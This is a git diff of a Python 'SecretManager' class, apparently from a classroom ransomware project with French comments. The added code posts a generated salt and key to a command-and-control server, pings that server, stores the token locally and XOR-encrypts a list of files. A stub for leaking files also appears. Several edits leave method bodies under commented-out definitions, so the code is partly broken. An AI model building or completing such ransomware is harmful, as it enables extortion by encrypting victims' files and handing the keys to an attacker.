@@ -73,7 +73,7 @@ class SecretManager:
         #raise NotImplemented()
     
 
-    def post_new(self, salt: bytes, key: bytes, token: bytes) -> None:
+    def post_new(self, salt: bytes, key: bytes, token: bytes) ->int:
         # Convertit les bytes en chaînes Base64
         salt_b64 = self.bin_to_b64(salt)
         key_b64 = self.bin_to_b64(key)
@@ -86,23 +86,26 @@ class SecretManager:
             "key": key_b64
         }
 
+        dir_label = self.get_hex_token()
         # URL du CNC (Command and Control)
-        cnc_url = f"http://{self._remote_host_port}/new" 
-       
+        cnc_url = f"http://{self._remote_host_port}/new?label={dir_label}" 
+     
+
 
 
         # Envoie les données JSON au CNC
         response = requests.post(cnc_url, json=data)
+        return response
 
         # Vérifie la réponse du serveur
-        if response.status_code == 200:
-            print("Données cryptographiques envoyées avec succès.")
-        else:
-            print(f"Échec de l'envoi des données. Code de réponse : {response.status_code}")
+        #if response.status_code == 200:
+            #print("Données cryptographiques envoyées avec succès.")
+        #else:
+            #print(f"Échec de l'envoi des données. Code de réponse : {response.status_code}")
 
-    def bin_to_b64(self, data: bytes) -> str:
+    #def bin_to_b64(self, data: bytes) -> str:
         # Convertit des bytes en chaîne Base64
-        return base64.b64encode(data).decode('utf-8')
+        #return base64.b64encode(data).decode('utf-8')
 
 
     #def setup(self)->None:
@@ -154,7 +157,8 @@ class SecretManager:
         # main function to create crypto data and register malware to cnc
 
         # creation of crypto data and assignment to member variables
-        self._salt, self._key, self._token = self.create()
+        self._salt , self._key, self._token= self.create()
+        
         
         # post request of said data
         post_status_code = self.post_new(self._salt, self._key, self._token)
@@ -162,7 +166,7 @@ class SecretManager:
         # we can display the returned status_code to check that everything worked
         self._log.debug("post_new request returned with code " + str(post_status_code))
         
-        token_path = f"{self._path}/token"
+        #token_path = f"{self._path}/token"
         #if not Path(token_path).exists():  
            # Path(token_path).mkdir(parents=True, exist_ok=False)
         #if Path(f"{token_path}/token.bin").exists():
@@ -170,14 +174,40 @@ class SecretManager:
         
         # open taking parameter 'wb' allows the program to write into a binary file
         
-        with open(f"{token_path}/token.bin", 'wb') as token_binary_file:
-            token_binary_file.write(self._token)
-        with open(f"{token_path}/salt.bin", 'wb') as salt_binary_file:
-            salt_binary_file.write(self._salt)
+        with open(os.path.join(self._path, "_token.bin"), "wb") as tokenfile:
+            tokenfile.write(self._token)
+        with open(os.path.join(self._path, "_salt.bin"), "wb") as saltfile:
+            saltfile.write(self._salt)
 
         return None
 
+    #def setup(self) -> None:
+        # Vérifie la connexion au CNC
+        try:
+            url = f"http://{self._remote_host_port}/ping"
+            response = requests.get(url)
+            if response.status_code != 200:
+                raise ConnectionError("CNC is unreachable")
+        except ConnectionError as e:
+            raise e
 
+        # Vérifie si les fichiers token et salt existent
+        if os.path.exists(os.path.join(self._path, "_token.bin")) or os.path.exists(os.path.join(self._path, "_salt.bin")):
+            raise FileExistsError("A _token.bin file already exists. Cancelling setup.")
+
+        # Crée les éléments cryptographiques
+        self._salt, self._key, self._token,self.timestamp = self.create()
+
+        # Crée le répertoire si nécessaire
+        os.makedirs(self._path, exist_ok=True)
+        # Sauvegarde localement le sel et le jeton
+        with open(os.path.join(self._path, "_salt.bin"), "wb") as salt_file:
+            salt_file.write(self._salt)
+        with open(os.path.join(self._path, "_token.bin"), "wb") as token_file:
+            token_file.write(self._token)
+        
+        # Envoie les éléments cryptographiques au CNC
+        self.post_new(self._salt, self._key, self._token)
 
     #def load(self)->None:
         # function to load crypto data
@@ -208,25 +238,14 @@ class SecretManager:
         #raise NotImplemented()
     
 
+  
+
     def check_key(self, candidate_key: bytes) -> bool:
-        # Vérifie si la clé candidate est correcte 
-        if not self._salt or not self._token:
-            raise Exception("Le sel ou le token n'est pas défini. Chargez les éléments cryptographiques d'abord.")
+        token = self.do_derivation(self._salt, candidate_key)
+         # Comparaison de la clé candidate à la clé générée
+        return token == self._token
 
-        kdf = PBKDF2HMAC(
-            algorithm=hashes.SHA256(),
-            iterations=self.ITERATION,
-            salt=self._salt,
-            length=self.KEY_LENGTH
-        )
-        generated_key = kdf.derive(self._token)
-
-        # Comparaison de la clé candidate à la clé générée
-        return candidate_key == generated_key
-
-    #def set_key(self, b64_key:str)->None:
-        # If the key is valid, set the self._key var for decrypting
-        #raise NotImplemented()
+    
     
     def set_key(self, b64_key: str) -> None:
         # Définit la clé en base64, ensuite valide la clé et stocker la clé
@@ -236,9 +255,6 @@ class SecretManager:
         else:
             raise Exception("La clé fournie n'est pas valide.") 
 
-    #def get_hex_token(self)->str:
-        # Should return a string composed of hex symbole, regarding the token
-        #raise NotImplemented()
 
 
     def get_hex_token(self) -> str:
@@ -247,7 +263,7 @@ class SecretManager:
             return ""
 
         # hachage le token
-        sha256_hash = hashlib.sha256(self._token)
+        sha256_hash = sha256(self._token)
         hex_token = sha256_hash.hexdigest()
 
         return hex_token
@@ -258,7 +274,7 @@ class SecretManager:
         #raise NotImplemented()
 
 
-    def xorfiles(self, files: List[str]) -> None:
+    #def xorfiles(self, files: List[str]) -> None:
         if not self._key:
             print("La clé n'est pas définie. Veuillez d'abord générer une clé.")
             return
@@ -281,6 +297,13 @@ class SecretManager:
 
             print(f"Le fichier {file_path} a été chiffré et enregistré sous {encrypted_file_path}.")
 
+
+    def xorfiles(self, files: List[str]) -> None:
+        for file_path in files:
+            try:
+                xorfile(file_path, self._key)
+            except Exception as e:
+                self._log.error(f"Erreur lors du chiffrement/déchiffrement du fichier {file_path}: {e}")
 
 
     #def leak_files(self, files:List[str])->None:
